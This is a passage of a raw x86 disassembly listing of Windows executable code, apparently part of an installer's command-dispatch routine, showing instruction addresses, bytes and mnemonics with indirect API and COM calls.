  401dc1:	e8 80 f6 ff ff       	call   0x401446
  401dc6:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401dc9:	c1 f9 02             	sar    $0x2,%ecx
  401dcc:	85 c9                	test   %ecx,%ecx
  401dce:	74 1f                	je     0x401def
  401dd0:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401dd3:	52                   	push   %edx
  401dd4:	51                   	push   %ecx
  401dd5:	6a 00                	push   $0x0
  401dd7:	ff 75 08             	push   0x8(%ebp)
  401dda:	ff 75 f8             	push   -0x8(%ebp)
  401ddd:	50                   	push   %eax
  401dde:	56                   	push   %esi
  401ddf:	ff 15 3c 82 40 00    	call   *0x40823c
  401de5:	f7 d8                	neg    %eax
  401de7:	1b c0                	sbb    %eax,%eax
  401de9:	40                   	inc    %eax
  401dea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ded:	eb 45                	jmp    0x401e34
  401def:	ff 75 08             	push   0x8(%ebp)
  401df2:	ff 75 f8             	push   -0x8(%ebp)
  401df5:	50                   	push   %eax
  401df6:	56                   	push   %esi
  401df7:	ff 15 78 82 40 00    	call   *0x408278
  401dfd:	eb 32                	jmp    0x401e31
  401dff:	33 f6                	xor    %esi,%esi
  401e01:	46                   	inc    %esi
  401e02:	e8 55 f6 ff ff       	call   0x40145c
  401e07:	6a 12                	push   $0x12
  401e09:	5e                   	pop    %esi
  401e0a:	8b d8                	mov    %eax,%ebx
  401e0c:	e8 4b f6 ff ff       	call   0x40145c
  401e11:	0f b7 08             	movzwl (%eax),%ecx
  401e14:	f7 d9                	neg    %ecx
  401e16:	1b c9                	sbb    %ecx,%ecx
  401e18:	23 c8                	and    %eax,%ecx
  401e1a:	0f b7 03             	movzwl (%ebx),%eax
  401e1d:	f7 d8                	neg    %eax
  401e1f:	51                   	push   %ecx
  401e20:	1b c0                	sbb    %eax,%eax
  401e22:	23 c3                	and    %ebx,%eax
  401e24:	50                   	push   %eax
  401e25:	ff 75 08             	push   0x8(%ebp)
  401e28:	ff 75 f8             	push   -0x8(%ebp)
  401e2b:	ff 15 5c 82 40 00    	call   *0x40825c
  401e31:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401e34:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  401e38:	0f 8c 1a 0e 00 00    	jl     0x402c58
  401e3e:	ff 75 f4             	push   -0xc(%ebp)
  401e41:	e9 0c 0e 00 00       	jmp    0x402c52
  401e46:	33 c9                	xor    %ecx,%ecx
  401e48:	e8 f9 f5 ff ff       	call   0x401446
  401e4d:	50                   	push   %eax
  401e4e:	ff 15 94 82 40 00    	call   *0x408294
  401e54:	e9 6a f9 ff ff       	jmp    0x4017c3
  401e59:	6a 02                	push   $0x2
  401e5b:	59                   	pop    %ecx
  401e5c:	e8 e5 f5 ff ff       	call   0x401446
  401e61:	33 c9                	xor    %ecx,%ecx
  401e63:	50                   	push   %eax
  401e64:	41                   	inc    %ecx
  401e65:	e8 dc f5 ff ff       	call   0x401446
  401e6a:	50                   	push   %eax
  401e6b:	ff 15 60 82 40 00    	call   *0x408260
  401e71:	e9 db 0d 00 00       	jmp    0x402c51
  401e76:	a1 e8 b2 47 00       	mov    0x47b2e8,%eax
  401e7b:	03 c2                	add    %edx,%eax
  401e7d:	50                   	push   %eax
  401e7e:	6a eb                	push   $0xffffffeb
  401e80:	33 c9                	xor    %ecx,%ecx
  401e82:	e8 bf f5 ff ff       	call   0x401446
  401e87:	50                   	push   %eax
  401e88:	ff 15 64 82 40 00    	call   *0x408264
  401e8e:	e9 c5 0d 00 00       	jmp    0x402c58
  401e93:	52                   	push   %edx
  401e94:	ff 75 f8             	push   -0x8(%ebp)
  401e97:	ff 15 60 82 40 00    	call   *0x408260
  401e9d:	8b f8                	mov    %eax,%edi
  401e9f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401ea2:	50                   	push   %eax
  401ea3:	57                   	push   %edi
  401ea4:	ff 15 84 82 40 00    	call   *0x408284
  401eaa:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401ead:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401eb1:	6a 10                	push   $0x10
  401eb3:	50                   	push   %eax
  401eb4:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401eb7:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ebb:	50                   	push   %eax
  401ebc:	33 db                	xor    %ebx,%ebx
  401ebe:	53                   	push   %ebx
  401ebf:	33 f6                	xor    %esi,%esi
  401ec1:	e8 96 f5 ff ff       	call   0x40145c
  401ec6:	50                   	push   %eax
  401ec7:	53                   	push   %ebx
  401ec8:	ff 15 68 82 40 00    	call   *0x408268
  401ece:	50                   	push   %eax
  401ecf:	53                   	push   %ebx
  401ed0:	68 72 01 00 00       	push   $0x172
  401ed5:	57                   	push   %edi
  401ed6:	ff 15 78 82 40 00    	call   *0x408278
  401edc:	3b c3                	cmp    %ebx,%eax
  401ede:	0f 84 74 0d 00 00    	je     0x402c58
  401ee4:	50                   	push   %eax
  401ee5:	ff 15 44 80 40 00    	call   *0x408044
  401eeb:	e9 68 0d 00 00       	jmp    0x402c58
  401ef0:	6a 48                	push   $0x48
  401ef2:	6a 5a                	push   $0x5a
  401ef4:	ff 75 f8             	push   -0x8(%ebp)
  401ef7:	ff 15 6c 82 40 00    	call   *0x40826c
  401efd:	50                   	push   %eax
  401efe:	ff 15 40 80 40 00    	call   *0x408040
  401f04:	50                   	push   %eax
  401f05:	6a 02                	push   $0x2
  401f07:	59                   	pop    %ecx
  401f08:	e8 39 f5 ff ff       	call   0x401446
  401f0d:	50                   	push   %eax
  401f0e:	ff 15 48 81 40 00    	call   *0x408148
  401f14:	6a 03                	push   $0x3
  401f16:	f7 d8                	neg    %eax
  401f18:	59                   	pop    %ecx
  401f19:	a3 10 e1 41 00       	mov    %eax,0x41e110
  401f1e:	e8 23 f5 ff ff       	call   0x401446
  401f23:	ff 75 e0             	push   -0x20(%ebp)
  401f26:	a3 20 e1 41 00       	mov    %eax,0x41e120
  401f2b:	8a 45 ec             	mov    -0x14(%ebp),%al
  401f2e:	8a c8                	mov    %al,%cl
  401f30:	80 e1 01             	and    $0x1,%cl
  401f33:	88 0d 24 e1 41 00    	mov    %cl,0x41e124
  401f39:	8a c8                	mov    %al,%cl
  401f3b:	80 e1 02             	and    $0x2,%cl
  401f3e:	24 04                	and    $0x4,%al
  401f40:	68 2c e1 41 00       	push   $0x41e12c
  401f45:	88 0d 25 e1 41 00    	mov    %cl,0x41e125
  401f4b:	a2 26 e1 41 00       	mov    %al,0x41e126
  401f50:	c6 05 27 e1 41 00 01 	movb   $0x1,0x41e127
  401f57:	e8 d1 42 00 00       	call   0x40622d
  401f5c:	68 10 e1 41 00       	push   $0x41e110
  401f61:	ff 15 4c 80 40 00    	call   *0x40804c
  401f67:	e9 e5 0c 00 00       	jmp    0x402c51
  401f6c:	33 c9                	xor    %ecx,%ecx
  401f6e:	e8 d3 f4 ff ff       	call   0x401446
  401f73:	33 c9                	xor    %ecx,%ecx
  401f75:	41                   	inc    %ecx
  401f76:	8b f0                	mov    %eax,%esi
  401f78:	e8 c9 f4 ff ff       	call   0x401446
  401f7d:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  401f81:	50                   	push   %eax
  401f82:	56                   	push   %esi
  401f83:	75 0b                	jne    0x401f90
  401f85:	ff 15 34 82 40 00    	call   *0x408234
  401f8b:	e9 c8 0c 00 00       	jmp    0x402c58
  401f90:	ff 15 70 82 40 00    	call   *0x408270
  401f96:	e9 bd 0c 00 00       	jmp    0x402c58
  401f9b:	33 f6                	xor    %esi,%esi
  401f9d:	e8 ba f4 ff ff       	call   0x40145c
  401fa2:	6a 31                	push   $0x31
  401fa4:	5e                   	pop    %esi
  401fa5:	8b f8                	mov    %eax,%edi
  401fa7:	e8 b0 f4 ff ff       	call   0x40145c
  401fac:	6a 22                	push   $0x22
  401fae:	5e                   	pop    %esi
  401faf:	89 45 08             	mov    %eax,0x8(%ebp)
  401fb2:	e8 a5 f4 ff ff       	call   0x40145c
  401fb7:	6a 15                	push   $0x15
  401fb9:	5e                   	pop    %esi
  401fba:	8b d8                	mov    %eax,%ebx
  401fbc:	e8 9b f4 ff ff       	call   0x40145c
  401fc1:	6a ec                	push   $0xffffffec
  401fc3:	e8 6d f4 ff ff       	call   0x401435
  401fc8:	0f b7 03             	movzwl (%ebx),%eax
  401fcb:	ff 75 e8             	push   -0x18(%ebp)
  401fce:	f7 d8                	neg    %eax
  401fd0:	1b c0                	sbb    %eax,%eax
  401fd2:	23 c3                	and    %ebx,%eax
  401fd4:	68 b0 40 4d 00       	push   $0x4d40b0
  401fd9:	50                   	push   %eax
  401fda:	0f b7 07             	movzwl (%edi),%eax
  401fdd:	ff 75 08             	push   0x8(%ebp)
  401fe0:	f7 d8                	neg    %eax
  401fe2:	1b c0                	sbb    %eax,%eax
  401fe4:	23 c7                	and    %edi,%eax
  401fe6:	50                   	push   %eax
  401fe7:	ff 75 f8             	push   -0x8(%ebp)
  401fea:	ff 15 84 81 40 00    	call   *0x408184
  401ff0:	83 f8 21             	cmp    $0x21,%eax
  401ff3:	0f 8d 5f 0c 00 00    	jge    0x402c58
  401ff9:	e9 23 f7 ff ff       	jmp    0x401721
  401ffe:	33 f6                	xor    %esi,%esi
  402000:	e8 57 f4 ff ff       	call   0x40145c
  402005:	8b f0                	mov    %eax,%esi
  402007:	56                   	push   %esi
  402008:	6a eb                	push   $0xffffffeb
  40200a:	e8 c7 2b 00 00       	call   0x404bd6
  40200f:	56                   	push   %esi
  402010:	e8 3a 38 00 00       	call   0x40584f
  402015:	89 45 08             	mov    %eax,0x8(%ebp)
  402018:	85 c0                	test   %eax,%eax
  40201a:	0f 84 01 f7 ff ff    	je     0x401721
  402020:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402024:	74 4f                	je     0x402075
  402026:	8b 35 24 81 40 00    	mov    0x408124,%esi
  40202c:	6a 64                	push   $0x64
  40202e:	50                   	push   %eax
  40202f:	ff d6                	call   *%esi
  402031:	bf 02 01 00 00       	mov    $0x102,%edi
  402036:	eb 0e                	jmp    0x402046
  402038:	6a 0f                	push   $0xf
  40203a:	e8 1a 3d 00 00       	call   0x405d59
  40203f:	6a 64                	push   $0x64
  402041:	ff 75 08             	push   0x8(%ebp)
  402044:	ff d6                	call   *%esi
  402046:	3b c7                	cmp    %edi,%eax
  402048:	74 ee                	je     0x402038
  40204a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40204d:	50                   	push   %eax
  40204e:	ff 75 08             	push   0x8(%ebp)
  402051:	ff 15 28 81 40 00    	call   *0x408128
  402057:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40205b:	7c 0b                	jl     0x402068
  40205d:	ff 75 f4             	push   -0xc(%ebp)
  402060:	53                   	push   %ebx
  402061:	e8 fc 3a 00 00       	call   0x405b62
  402066:	eb 0d                	jmp    0x402075
  402068:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40206c:	74 07                	je     0x402075
  40206e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402075:	ff 75 08             	push   0x8(%ebp)
  402078:	e9 40 06 00 00       	jmp    0x4026bd
  40207d:	6a 02                	push   $0x2
  40207f:	5e                   	pop    %esi
  402080:	e8 d7 f3 ff ff       	call   0x40145c
  402085:	50                   	push   %eax
  402086:	e8 70 3c 00 00       	call   0x405cfb
  40208b:	8b f0                	mov    %eax,%esi
  40208d:	85 f6                	test   %esi,%esi
  40208f:	74 11                	je     0x4020a2
  402091:	ff 76 14             	push   0x14(%esi)
  402094:	53                   	push   %ebx
  402095:	e8 c8 3a 00 00       	call   0x405b62
  40209a:	ff 76 18             	push   0x18(%esi)
  40209d:	e9 b0 0b 00 00       	jmp    0x402c52
  4020a2:	33 c0                	xor    %eax,%eax
  4020a4:	66 89 07             	mov    %ax,(%edi)
  4020a7:	66 89 03             	mov    %ax,(%ebx)
  4020aa:	e9 72 f6 ff ff       	jmp    0x401721
  4020af:	6a ee                	push   $0xffffffee
  4020b1:	5e                   	pop    %esi
  4020b2:	e8 a5 f3 ff ff       	call   0x40145c
  4020b7:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4020ba:	51                   	push   %ecx
  4020bb:	50                   	push   %eax
  4020bc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4020bf:	e8 b6 57 00 00       	call   0x40787a
  4020c4:	8b f0                	mov    %eax,%esi
  4020c6:	33 c0                	xor    %eax,%eax
  4020c8:	66 89 07             	mov    %ax,(%edi)
  4020cb:	66 89 03             	mov    %ax,(%ebx)
  4020ce:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020d5:	85 f6                	test   %esi,%esi
  4020d7:	0f 84 7b 0b 00 00    	je     0x402c58
  4020dd:	56                   	push   %esi
  4020de:	6a 40                	push   $0x40
  4020e0:	ff 15 20 81 40 00    	call   *0x408120
  4020e6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4020e9:	85 c0                	test   %eax,%eax
  4020eb:	0f 84 67 0b 00 00    	je     0x402c58
  4020f1:	50                   	push   %eax
  4020f2:	56                   	push   %esi
  4020f3:	6a 00                	push   $0x0
  4020f5:	ff 75 d4             	push   -0x2c(%ebp)
  4020f8:	e8 77 57 00 00       	call   0x407874
  4020fd:	85 c0                	test   %eax,%eax
  4020ff:	74 35                	je     0x402136
  402101:	8d 45 cc             	lea    -0x34(%ebp),%eax
  402104:	50                   	push   %eax
  402105:	8d 45 08             	lea    0x8(%ebp),%eax
  402108:	50                   	push   %eax
  402109:	68 c8 82 40 00       	push   $0x4082c8
  40210e:	ff 75 f4             	push   -0xc(%ebp)
  402111:	e8 58 57 00 00       	call   0x40786e
  402116:	85 c0                	test   %eax,%eax
  402118:	74 1c                	je     0x402136
  40211a:	8b 45 08             	mov    0x8(%ebp),%eax
  40211d:	ff 70 08             	push   0x8(%eax)
  402120:	57                   	push   %edi
  402121:	e8 3c 3a 00 00       	call   0x405b62
  402126:	8b 45 08             	mov    0x8(%ebp),%eax
  402129:	ff 70 0c             	push   0xc(%eax)
  40212c:	53                   	push   %ebx
  40212d:	e8 30 3a 00 00       	call   0x405b62
  402132:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402136:	ff 75 f4             	push   -0xc(%ebp)
  402139:	ff 15 2c 81 40 00    	call   *0x40812c
  40213f:	e9 14 0b 00 00       	jmp    0x402c58
  402144:	83 3d 98 b3 47 00 00 	cmpl   $0x0,0x47b398
  40214b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402152:	0f 8c b9 00 00 00    	jl     0x402211
  402158:	6a f0                	push   $0xfffffff0
  40215a:	5e                   	pop    %esi
  40215b:	e8 fc f2 ff ff       	call   0x40145c
  402160:	33 f6                	xor    %esi,%esi
  402162:	46                   	inc    %esi
  402163:	8b f8                	mov    %eax,%edi
  402165:	e8 f2 f2 ff ff       	call   0x40145c
  40216a:	33 f6                	xor    %esi,%esi
  40216c:	89 45 08             	mov    %eax,0x8(%ebp)
  40216f:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  402172:	74 0d                	je     0x402181
  402174:	57                   	push   %edi
  402175:	ff 15 30 81 40 00    	call   *0x408130
  40217b:	8b d8                	mov    %eax,%ebx
  40217d:	3b de                	cmp    %esi,%ebx
  40217f:	75 10                	jne    0x402191
  402181:	6a 08                	push   $0x8
  402183:	56                   	push   %esi
  402184:	57                   	push   %edi
  402185:	ff 15 34 81 40 00    	call   *0x408134
  40218b:	8b d8                	mov    %eax,%ebx
  40218d:	3b de                	cmp    %esi,%ebx
  40218f:	74 79                	je     0x40220a
  402191:	ff 75 08             	push   0x8(%ebp)
  402194:	53                   	push   %ebx
  402195:	e8 f2 3b 00 00       	call   0x405d8c
  40219a:	8b f8                	mov    %eax,%edi
  40219c:	3b fe                	cmp    %esi,%edi
  40219e:	74 3d                	je     0x4021dd
  4021a0:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4021a3:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  4021a6:	74 17                	je     0x4021bf
  4021a8:	ff 75 e4             	push   -0x1c(%ebp)
  4021ab:	e8 85 f2 ff ff       	call   0x401435
  4021b0:	ff d7                	call   *%edi
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	74 31                	je     0x4021e7
  4021b6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4021bd:	eb 28                	jmp    0x4021e7
  4021bf:	68 00 a0 40 00       	push   $0x40a000
  4021c4:	68 e0 a0 40 00       	push   $0x40a0e0
  4021c9:	68 00 c0 47 00       	push   $0x47c000
  4021ce:	68 04 20 00 00       	push   $0x2004
  4021d3:	ff 75 f8             	push   -0x8(%ebp)
  4021d6:	ff d7                	call   *%edi
  4021d8:	83 c4 14             	add    $0x14,%esp
  4021db:	eb 0a                	jmp    0x4021e7
  4021dd:	ff 75 08             	push   0x8(%ebp)
  4021e0:	6a f7                	push   $0xfffffff7
  4021e2:	e8 ef 29 00 00       	call   0x404bd6
  4021e7:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  4021ea:	0f 85 68 0a 00 00    	jne    0x402c58
  4021f0:	53                   	push   %ebx
  4021f1:	e8 ad 17 00 00       	call   0x4039a3
  4021f6:	85 c0                	test   %eax,%eax
  4021f8:	0f 84 5a 0a 00 00    	je     0x402c58
  4021fe:	53                   	push   %ebx
  4021ff:	ff 15 38 81 40 00    	call   *0x408138
  402205:	e9 4e 0a 00 00       	jmp    0x402c58
  40220a:	6a f6                	push   $0xfffffff6
  40220c:	e9 9b f5 ff ff       	jmp    0x4017ac
  402211:	6a e7                	push   $0xffffffe7
  402213:	e9 94 f5 ff ff       	jmp    0x4017ac
  402218:	6a f0                	push   $0xfffffff0
  40221a:	5e                   	pop    %esi
  40221b:	e8 3c f2 ff ff       	call   0x40145c
  402220:	6a df                	push   $0xffffffdf
  402222:	5e                   	pop    %esi
  402223:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402226:	e8 31 f2 ff ff       	call   0x40145c
  40222b:	6a 02                	push   $0x2
  40222d:	5e                   	pop    %esi
  40222e:	8b d8                	mov    %eax,%ebx
  402230:	e8 27 f2 ff ff       	call   0x40145c
  402235:	6a cd                	push   $0xffffffcd
  402237:	5e                   	pop    %esi
  402238:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40223b:	e8 1c f2 ff ff       	call   0x40145c
  402240:	6a 45                	push   $0x45
  402242:	5e                   	pop    %esi
  402243:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402246:	e8 11 f2 ff ff       	call   0x40145c
  40224b:	53                   	push   %ebx
  40224c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40224f:	e8 e1 36 00 00       	call   0x405935
  402254:	85 c0                	test   %eax,%eax
  402256:	75 08                	jne    0x402260
  402258:	6a 21                	push   $0x21
  40225a:	5e                   	pop    %esi
  40225b:	e8 fc f1 ff ff       	call   0x40145c
  402260:	8d 45 08             	lea    0x8(%ebp),%eax
  402263:	50                   	push   %eax
  402264:	68 f4 8a 40 00       	push   $0x408af4
  402269:	6a 01                	push   $0x1
  40226b:	6a 00                	push   $0x0
  40226d:	68 14 8b 40 00       	push   $0x408b14
  402272:	ff 15 b8 82 40 00    	call   *0x4082b8
  402278:	85 c0                	test   %eax,%eax
  40227a:	0f 8c bb 00 00 00    	jl     0x40233b
  402280:	8b 45 08             	mov    0x8(%ebp),%eax
  402283:	8b 08                	mov    (%eax),%ecx
  402285:	8d 55 f4             	lea    -0xc(%ebp),%edx
  402288:	52                   	push   %edx
  402289:	68 04 8b 40 00       	push   $0x408b04
  40228e:	50                   	push   %eax
  40228f:	ff 11                	call   *(%ecx)
  402291:	8b f8                	mov    %eax,%edi
  402293:	85 ff                	test   %edi,%edi
  402295:	0f 8c 93 00 00 00    	jl     0x40232e
  40229b:	8b 45 08             	mov    0x8(%ebp),%eax
  40229e:	8b 08                	mov    (%eax),%ecx
  4022a0:	53                   	push   %ebx
  4022a1:	50                   	push   %eax
  4022a2:	ff 51 50             	call   *0x50(%ecx)
  4022a5:	8b f8                	mov    %eax,%edi
  4022a7:	8b 45 08             	mov    0x8(%ebp),%eax
  4022aa:	8b 08                	mov    (%eax),%ecx
  4022ac:	68 b0 40 4d 00       	push   $0x4d40b0
  4022b1:	50                   	push   %eax
  4022b2:	ff 51 24             	call   *0x24(%ecx)
  4022b5:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022b8:	8b c1                	mov    %ecx,%eax
  4022ba:	c1 f8 08             	sar    $0x8,%eax
  4022bd:	be ff 00 00 00       	mov    $0xff,%esi
  4022c2:	23 c6                	and    %esi,%eax
  4022c4:	74 0d                	je     0x4022d3
  4022c6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4022c9:	8b 11                	mov    (%ecx),%edx
  4022cb:	50                   	push   %eax
  4022cc:	51                   	push   %ecx
  4022cd:	ff 52 3c             	call   *0x3c(%edx)
  4022d0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022d3:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d6:	8b 10                	mov    (%eax),%edx
  4022d8:	c1 f9 10             	sar    $0x10,%ecx
  4022db:	51                   	push   %ecx
  4022dc:	50                   	push   %eax
  4022dd:	ff 52 34             	call   *0x34(%edx)
  4022e0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4022e3:	66 83 38 00          	cmpw   $0x0,(%eax)
  4022e7:	74 10                	je     0x4022f9
  4022e9:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  4022ec:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4022ef:	8b 11                	mov    (%ecx),%edx
  4022f1:	23 de                	and    %esi,%ebx
  4022f3:	53                   	push   %ebx
  4022f4:	50                   	push   %eax
  4022f5:	51                   	push   %ecx
  4022f6:	ff 52 44             	call   *0x44(%edx)
  4022f9:	8b 45 08             	mov    0x8(%ebp),%eax
  4022fc:	ff 75 f8             	push   -0x8(%ebp)
  4022ff:	8b 08                	mov    (%eax),%ecx
  402301:	50                   	push   %eax
  402302:	ff 51 2c             	call   *0x2c(%ecx)
  402305:	8b 45 08             	mov    0x8(%ebp),%eax
  402308:	ff 75 cc             	push   -0x34(%ebp)
  40230b:	8b 08                	mov    (%eax),%ecx
  40230d:	50                   	push   %eax
  40230e:	ff 51 1c             	call   *0x1c(%ecx)
  402311:	85 ff                	test   %edi,%edi
  402313:	7c 10                	jl     0x402325
  402315:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402318:	8b 08                	mov    (%eax),%ecx
  40231a:	6a 01                	push   $0x1
  40231c:	ff 75 c4             	push   -0x3c(%ebp)
  40231f:	50                   	push   %eax
  402320:	ff 51 18             	call   *0x18(%ecx)
  402323:	8b f8                	mov    %eax,%edi
  402325:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402328:	8b 08                	mov    (%eax),%ecx
  40232a:	50                   	push   %eax
  40232b:	ff 51 08             	call   *0x8(%ecx)
  40232e:	8b 45 08             	mov    0x8(%ebp),%eax
  402331:	8b 08                	mov    (%eax),%ecx
  402333:	50                   	push   %eax
  402334:	ff 51 08             	call   *0x8(%ecx)
  402337:	85 ff                	test   %edi,%edi
  402339:	7d 0e                	jge    0x402349
  40233b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402342:	6a f0                	push   $0xfffffff0
  402344:	e9 63 f4 ff ff       	jmp    0x4017ac
  402349:	6a f4                	push   $0xfffffff4
  40234b:	e9 5c f4 ff ff       	jmp    0x4017ac
  402350:	33 f6                	xor    %esi,%esi
  402352:	e8 05 f1 ff ff       	call   0x40145c
  402357:	6a 11                	push   $0x11
  402359:	5e                   	pop    %esi
  40235a:	8b f8                	mov    %eax,%edi
  40235c:	e8 fb f0 ff ff       	call   0x40145c
  402361:	6a 23                	push   $0x23
  402363:	5e                   	pop    %esi
  402364:	8b d8                	mov    %eax,%ebx
  402366:	e8 f1 f0 ff ff       	call   0x40145c
  40236b:	57                   	push   %edi
  40236c:	8b f0                	mov    %eax,%esi
  40236e:	e8 88 39 00 00       	call   0x405cfb
  402373:	85 c0                	test   %eax,%eax
  402375:	75 0e                	jne    0x402385
  402377:	6a 00                	push   $0x0
  402379:	6a f9                	push   $0xfffffff9
  40237b:	e8 56 28 00 00       	call   0x404bd6
  402380:	e9 9c f3 ff ff       	jmp    0x401721
  402385:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402388:	57                   	push   %edi
  402389:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40238c:	c7 45 b0 02 00 00 00 	movl   $0x2,-0x50(%ebp)
  402393:	e8 99 38 00 00       	call   0x405c31
  402398:	33 c9                	xor    %ecx,%ecx
  40239a:	53                   	push   %ebx
  40239b:	66 89 4c 47 02       	mov    %cx,0x2(%edi,%eax,2)
  4023a0:	e8 8c 38 00 00       	call   0x405c31
  4023a5:	33 c9                	xor    %ecx,%ecx
  4023a7:	66 89 4c 43 02       	mov    %cx,0x2(%ebx,%eax,2)
  4023ac:	66 8b 45 e4          	mov    -0x1c(%ebp),%ax
  4023b0:	56                   	push   %esi
  4023b1:	51                   	push   %ecx
  4023b2:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  4023b5:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4023b8:	89 75 c6             	mov    %esi,-0x3a(%ebp)
  4023bb:	66 89 45 bc          	mov    %ax,-0x44(%ebp)
  4023bf:	e8 12 28 00 00       	call   0x404bd6
  4023c4:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4023c7:	50                   	push   %eax
  4023c8:	ff 15 88 81 40 00    	call   *0x408188
  4023ce:	85 c0                	test   %eax,%eax
  4023d0:	0f 84 82 08 00 00    	je     0x402c58
  4023d6:	eb 9f                	jmp    0x402377
  4023d8:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023dd:	0f 85 02 f9 ff ff    	jne    0x401ce5
  4023e3:	ff 05 74 b3 47 00    	incl   0x47b374
  4023e9:	e9 6a 08 00 00       	jmp    0x402c58
  4023ee:	33 db                	xor    %ebx,%ebx
  4023f0:	33 ff                	xor    %edi,%edi
  4023f2:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4023f5:	3b c3                	cmp    %ebx,%eax
  4023f7:	74 0c                	je     0x402405
  4023f9:	33 f6                	xor    %esi,%esi
  4023fb:	e8 5c f0 ff ff       	call   0x40145c
  402400:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402403:	8b f8                	mov    %eax,%edi
  402405:	85 d2                	test   %edx,%edx
  402407:	74 0b                	je     0x402414
  402409:	6a 11                	push   $0x11
  40240b:	5e                   	pop    %esi
  40240c:	e8 4b f0 ff ff       	call   0x40145c
  402411:	89 45 08             	mov    %eax,0x8(%ebp)
  402414:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402417:	74 0a                	je     0x402423
  402419:	6a 22                	push   $0x22
  40241b:	5e                   	pop    %esi
  40241c:	e8 3b f0 ff ff       	call   0x40145c
  402421:	8b d8                	mov    %eax,%ebx
  402423:	6a cd                	push   $0xffffffcd
  402425:	5e                   	pop    %esi
  402426:	e8 31 f0 ff ff       	call   0x40145c
  40242b:	50                   	push   %eax
  40242c:	53                   	push   %ebx
  40242d:	ff 75 08             	push   0x8(%ebp)
  402430:	57                   	push   %edi
  402431:	ff 15 3c 81 40 00    	call   *0x40813c
  402437:	e9 dd f2 ff ff       	jmp    0x401719
  40243c:	a1 c0 82 40 00       	mov    0x4082c0,%eax
  402441:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402444:	a1 c4 82 40 00       	mov    0x4082c4,%eax
  402449:	33 f6                	xor    %esi,%esi
  40244b:	46                   	inc    %esi
  40244c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40244f:	e8 08 f0 ff ff       	call   0x40145c
  402454:	6a 12                	push   $0x12
  402456:	5e                   	pop    %esi
  402457:	8b d8                	mov    %eax,%ebx
  402459:	e8 fe ef ff ff       	call   0x40145c
  40245e:	6a dd                	push   $0xffffffdd
  402460:	5e                   	pop    %esi
  402461:	89 45 08             	mov    %eax,0x8(%ebp)
  402464:	e8 f3 ef ff ff       	call   0x40145c
  402469:	50                   	push   %eax
  40246a:	68 03 20 00 00       	push   $0x2003
  40246f:	57                   	push   %edi
  402470:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402473:	50                   	push   %eax
  402474:	ff 75 08             	push   0x8(%ebp)
  402477:	53                   	push   %ebx
  402478:	ff 15 40 81 40 00    	call   *0x408140
  40247e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402481:	50                   	push   %eax
  402482:	57                   	push   %edi
  402483:	ff 15 18 81 40 00    	call   *0x408118
  402489:	e9 1c f4 ff ff       	jmp    0x4018aa
  40248e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402492:	75 2c                	jne    0x4024c0
  402494:	6a 02                	push   $0x2
  402496:	e8 b2 f0 ff ff       	call   0x40154d
  40249b:	8b f8                	mov    %eax,%edi
  40249d:	85 ff                	test   %edi,%edi
  40249f:	0f 84 7c f2 ff ff    	je     0x401721
  4024a5:	6a 33                	push   $0x33
  4024a7:	5e                   	pop    %esi
  4024a8:	e8 af ef ff ff       	call   0x40145c
  4024ad:	50                   	push   %eax
  4024ae:	57                   	push   %edi
  4024af:	ff 15 10 80 40 00    	call   *0x408010
  4024b5:	57                   	push   %edi
  4024b6:	8b f0                	mov    %eax,%esi
  4024b8:	ff 15 08 80 40 00    	call   *0x408008
  4024be:	eb 2b                	jmp    0x4024eb
  4024c0:	6a 22                	push   $0x22
  4024c2:	5e                   	pop    %esi
